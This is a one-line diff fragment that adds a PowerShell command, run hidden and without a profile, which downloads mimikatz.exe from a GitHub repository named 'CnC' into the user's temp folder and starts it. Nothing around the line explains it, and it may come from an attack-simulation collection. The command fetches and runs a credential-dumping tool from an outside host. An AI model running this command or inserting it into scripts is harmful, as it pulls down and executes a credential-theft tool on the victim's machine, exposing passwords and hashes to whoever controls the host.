@@ -1,0 +1,1 @@
+powershell.exe -nop -w hidden -command Import-Module BitsTransfer; Start-BitsTransfer -Source https://github.com/ShilpeshTrivedi/CnC/blob/main/mimikatz.exe?raw=true -Destination '$env:TEMP\mimikatz.exe'; Start-Process '$env:TEMP\mimikatz.exe'
